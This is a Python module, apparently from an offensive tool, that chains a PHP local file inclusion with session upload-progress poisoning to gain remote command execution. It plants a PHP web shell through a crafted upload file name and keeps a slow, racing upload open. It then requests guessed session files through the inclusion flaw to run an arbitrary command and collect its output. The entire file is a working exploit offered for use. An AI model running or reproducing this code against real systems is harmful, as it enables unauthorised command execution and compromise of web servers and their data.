from __future__ import annotations

import os
import re
import secrets
import string
import threading
import time
import urllib.parse
from dataclasses import dataclass, field

from .httpio import Failure, Request, Response, Target, send, send_once
from .multipart import Multipart

COMMON_SESSION_DIRS = [
    "/var/lib/php/sessions",
    "/var/lib/php5",
    "/tmp",
    "/var/tmp",
    "/opt/homebrew/var/php/sessions",
    "/var/cpanel/php/sessions/ea-php83",
    "/var/cpanel/php/sessions/ea-php82",
    "/var/cpanel/php/sessions/ea-php81",
    "/var/cpanel/php/sessions/ea-php80",
    "/var/cpanel/php/sessions/ea-php74",
]


@dataclass
class ExecConfig:
    target: Target
    lfi: str
    cmd: str
    upload_path: str
    sid: str
    cookie: str = ""
    headers: dict[str, str] = field(default_factory=dict)
    sessions_dir: str | None = None
    slow_mb: int = 2
    verbose: bool = False

    @property
    def cookie_header(self) -> str:
        parts: list[str] = []
        if self.cookie.strip():
            parts.append(self.cookie.strip().rstrip(";"))
        if not re.search(rf"(^|;\s*)PHPSESSID=", self.cookie or ""):
            parts.append(f"PHPSESSID={self.sid}")
        return "; ".join(parts)

    def session_paths(self) -> list[str]:
        if self.sessions_dir:
            return [os.path.join(self.sessions_dir, f"sess_{self.sid}")]
        return [os.path.join(directory, f"sess_{self.sid}") for directory in COMMON_SESSION_DIRS]


def new_sid(length: int = 26) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))


def new_nonce() -> str:
    return secrets.token_hex(5)


def payload_filename(nonce: str, parameter: str = "c") -> str:
    return (
        f'<?php echo "PHPWN{nonce}S:"; system($_REQUEST["{parameter}"]); '
        f'echo ":PHPWN{nonce}E"; ?>'
    )


def build_upload(cfg: ExecConfig, filename: str, size: int) -> Multipart:
    mp = Multipart()
    mp.field("PHP_SESSION_UPLOAD_PROGRESS", "x")
    mp.file("file", filename, b"Z" * size)
    return mp


def upload_headers(cfg: ExecConfig, mp: Multipart, connection: str = "close") -> dict[str, str]:
    headers = {
        "Content-Type": mp.content_type,
        "Cookie": cfg.cookie_header,
        "Connection": connection,
    }
    headers.update(cfg.headers)
    return headers


def lfi_url(cfg: ExecConfig, session_path: str) -> str:
    quoted = urllib.parse.quote(session_path, safe="")
    base = cfg.lfi
    if "{file}" in base:
        url = base.replace("{file}", quoted)
    elif base.endswith("="):
        url = base + quoted
    elif "?" in base:
        url = f"{base}&file={quoted}"
    else:
        url = f"{base}?file={quoted}"
    separator = "&" if "?" in url else "?"
    return f"{url}{separator}c={urllib.parse.quote(cfg.cmd)}"


def fetch_lfi(cfg: ExecConfig, url: str) -> Response | Failure:
    target = Target(
        url,
        insecure=cfg.target.insecure,
        allow_http=cfg.target.scheme == "http",
        timeout=cfg.target.timeout,
        ca_file=cfg.target.ca_file,
    )
    headers = {"Cookie": cfg.cookie_header, "Connection": "close"}
    headers.update(cfg.headers)
    return send_once(target, Request("GET", target.request_path, headers))


def extract_output(body: bytes, nonce: str) -> str | None:
    text = body.decode("latin-1", errors="replace")
    start_marker = f"PHPWN{nonce}S:"
    end_marker = f":PHPWN{nonce}E"
    starts = [match.start() for match in re.finditer(re.escape(start_marker), text)]
    if not starts:
        return None
    start = starts[-1] + len(start_marker)
    end = text.find(end_marker, start)
    if end == -1:
        return None
    return text[start:end]


def _upload_once(cfg: ExecConfig, mp: Multipart) -> Response | Failure:
    req = Request("POST", cfg.upload_path, upload_headers(cfg, mp), mp.to_bytes())
    return send_once(cfg.target, req)


def _slow_upload(cfg: ExecConfig, mp: Multipart, stop: threading.Event) -> None:
    body = mp.to_bytes()
    prefix = mp.prefix_length(1) + 2048
    prefix = min(prefix, len(body))
    conn = cfg.target.connection()
    try:
        req = Request("POST", cfg.upload_path, upload_headers(cfg, mp, connection="close"), None)
        req = req.with_defaults()
        conn.putrequest(req.method, req.path, skip_accept_encoding=True)
        for key, value in req.headers.items():
            conn.putheader(key, value)
        conn.putheader("Content-Length", str(len(body)))
        conn.endheaders()
        conn.send(body[:prefix])
        offset = prefix
        while offset < len(body) and not stop.is_set():
            chunk = body[offset : offset + 65536]
            try:
                conn.send(chunk)
            except OSError:
                break
            offset += len(chunk)
            time.sleep(0.15)
        if not stop.is_set():
            try:
                response = conn.getresponse()
                response.read()
            except OSError:
                pass
    finally:
        conn.close()


def _search(cfg: ExecConfig, nonce: str) -> str | None:
    for session_path in cfg.session_paths():
        url = lfi_url(cfg, session_path)
        result = fetch_lfi(cfg, url)
        if isinstance(result, Failure):
            if cfg.verbose:
                print(f"[.] {session_path}: {result.kind}")
            continue
        output = extract_output(result.body, nonce)
        if output is not None:
            return output
        if cfg.verbose:
            print(f"[.] {session_path}: no marker (HTTP {result.status})")
    return None


def _attempt(cfg: ExecConfig, size: int, slow: bool) -> str | None:
    nonce = new_nonce()
    mp = build_upload(cfg, payload_filename(nonce), size)
    if not slow:
        result = _upload_once(cfg, mp)
        if cfg.verbose:
            status = result.status if isinstance(result, Response) else result.kind
            print(f"[.] fast upload: {status}")
        return _search(cfg, nonce)

    stop = threading.Event()
    thread = threading.Thread(target=_slow_upload, args=(cfg, mp, stop), daemon=True)
    thread.start()
    deadline = time.time() + max(6.0, size / (65536 * 6))
    output = None
    while time.time() < deadline and thread.is_alive():
        time.sleep(0.35)
        output = _search(cfg, nonce)
        if output is not None:
            stop.set()
            break
    thread.join(timeout=3)
    if output is None:
        output = _search(cfg, nonce)
    return output


def run(cfg: ExecConfig) -> tuple[bool, str]:
    output = _attempt(cfg, 1024, slow=False)
    if output is not None:
        return True, output
    output = _attempt(cfg, cfg.slow_mb * 1024 * 1024, slow=True)
    if output is not None:
        return True, output
    return False, ""
